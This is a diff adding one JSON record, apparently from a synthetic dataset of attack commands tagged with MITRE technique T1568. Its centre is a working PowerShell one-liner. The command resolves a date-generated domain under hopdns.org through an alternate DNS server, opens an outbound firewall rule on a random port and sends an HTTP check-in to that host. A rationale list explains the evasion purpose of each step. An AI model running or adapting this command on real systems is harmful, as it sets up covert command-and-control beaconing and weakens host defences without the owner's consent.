@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $dom=('ns{0}.hopdns.org' -f ((Get-Date).ToString('ddHH'))); ipconfig /flushdns | Out-Null; $a=Resolve-DnsName $dom -Type A -DnsOnly -NoHostsFile -Server '1.0.0.1' -ErrorAction SilentlyContinue; if($a){ $port=@(8081,8444,9001) | Get-Random; netsh advfirewall firewall add rule name=('out_'+$port) dir=out action=allow protocol=TCP remoteport=$port | Out-Null; Invoke-WebRequest -Uri ('http://{0}:{1}/b' -f $dom,$port) -Headers @{ Host=$dom } -TimeoutSec (Get-Random -Min 4 -Max 9) -UseBasicParsing } }",
+  "explanation": "Flushes caches and performs DNS-only resolution via an alternate resolver, randomizes the egress port from a small set of uncommon ports, and initiates a benign-looking HTTP request.",
+  "rationale_steps": [
+    "Avoid cached or hosts-file-influenced answers by forcing DNS-only resolution.",
+    "Resolve a DGA domain using a non-default resolver.",
+    "Allow outbound connectivity on a randomly chosen uncommon port.",
+    "Send a check-in using Host header routing and randomized timeout."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-5b98f3ee-e59a5512",
+  "source_prompt_hash": "5b98f3ee",
+  "timestamp_utc": "2025-09-30T09:58:10.642945Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
